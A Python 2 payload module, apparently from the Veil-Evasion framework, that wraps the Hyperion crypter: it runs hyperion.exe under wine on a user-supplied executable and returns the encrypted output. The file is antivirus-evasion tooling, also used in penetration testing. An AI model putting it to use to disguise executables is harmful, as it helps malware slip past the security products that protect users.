"""

Automates the running the the Hyperion crypter on an existing .exe

More information (Nullsecurity) - http://www.nullsecurity.net/papers/nullsec-bsides-slides.pdf

"""

import sys, time, subprocess, os

from modules.common import helpers

# the main config file
import settings

class Payload:

    def __init__(self):
        # required options
        self.description = "Automates the running of the Hyperion crypter on an existing .exe"
        self.language = "native"
        self.rating = "Normal"
        self.extension = "exe"

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "ORIGINAL_EXE" : ["", "The executable to run Hyperion on"]
                                }

    def generate(self):

        # randomize the output file so we don't overwrite anything
        randName = helpers.randomString(5) + ".exe"
        outputFile = settings.TEMP_DIR + randName

        if not os.path.isfile(self.required_options["ORIGINAL_EXE"][0]):
            print "\nError during Hyperion execution:\nInput file does not exist"
            raw_input("\n[>] Press any key to return to the main menu.")
            return ""

        print helpers.color("\n[*] Running Hyperion on " + self.required_options["ORIGINAL_EXE"][0] + "...")

        # the command to invoke hyperion. TODO: windows compatibility
        # be sure to set 'cwd' to the proper directory for hyperion so it properly runs
        command = ['wine', settings.VEIL_EVASION_PATH + 'tools/hyperion/hyperion.exe', self.required_options["ORIGINAL_EXE"][0], outputFile]
        p = subprocess.Popen(command, cwd=settings.VEIL_EVASION_PATH+"tools/hyperion/")
        stdout, stderr = p.communicate()

        try:
            # read in the output .exe from /tmp/
            f = open(outputFile, 'rb')
            PayloadCode = f.read()
            f.close()
            command2 = "rm " + outputFile
            p2 = subprocess.Popen(command2.split())
            stdout, stderr = p.communicate()
        except IOError:
            print "\nError during Hyperion execution:\n" + helpers.color(stdout, warning=True)
            raw_input("\n[>] Press any key to return to the main menu.")
            return ""

        # cleanup the temporary output file. TODO: windows compatibility
        if os.path.isfile(outputFile):
            p = subprocess.Popen(["rm", outputFile], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = p.communicate()

        return PayloadCode
